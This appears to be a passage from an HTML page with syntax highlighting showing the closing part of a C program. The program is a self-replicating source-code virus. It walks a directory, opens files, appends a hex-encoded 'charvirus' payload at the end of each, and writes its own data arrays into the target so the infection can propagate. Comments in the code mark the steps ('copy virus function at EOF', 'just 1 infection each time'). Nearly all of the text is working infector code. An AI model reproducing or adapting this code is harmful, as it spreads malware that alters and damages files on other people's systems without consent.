            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">writemain</span><span class="sc10">,</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">writebyte</span><span class="sc10">=</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">writemain</span><span class="sc10">,</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,-</span><span class="sc11">writebyte</span><span class="sc10">,</span><span class="sc11">SEEK_CUR</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">readmain</span><span class="sc10">,</span><span class="sc11">readbyte</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
              </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,-</span><span class="sc11">readbyte</span><span class="sc10">,</span><span class="sc11">SEEK_CUR</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">writemain</span><span class="sc10">,</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc1">/* copy virus function at EOF */</span><span class="sc0">
          </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charvirus</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">nibble</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">charvirus</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">nibble</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">charvirus</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">nibble</span><span class="sc10">,</span><span class="sc6">"%02X"</span><span class="sc10">,&amp;</span><span class="sc11">nibblechar</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nibblechar</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
              </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\n  char charinclude[] = \""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"\n  char charinclude[] = \""</span><span class="sc10">));</span><span class="sc0">
              </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charinclude</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charinclude</span><span class="sc10">));</span><span class="sc0">
              </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n  char charvirus[] = \""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"\";\n  char charvirus[] = \""</span><span class="sc10">));</span><span class="sc0">
              </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charvirus</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charvirus</span><span class="sc10">));</span><span class="sc0">
              </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n  char charvirusend[] = \""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"\";\n  char charvirusend[] = \""</span><span class="sc10">));</span><span class="sc0">
              </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charvirusend</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charvirusend</span><span class="sc10">));</span><span class="sc0">
              </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"\";\n"</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charvirusend</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">nibble</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">charvirusend</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">nibble</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">charvirusend</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">nibble</span><span class="sc10">,</span><span class="sc6">"%02X"</span><span class="sc10">,&amp;</span><span class="sc11">nibblechar</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nibblechar</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc1">/* that's all folks! */</span><span class="sc0">
          </span><span class="sc1">/* just 1 infection each time */</span><span class="sc0">
          </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">closedir</span><span class="sc10">(</span><span class="sc19">dd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc1">/* sauce! */</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
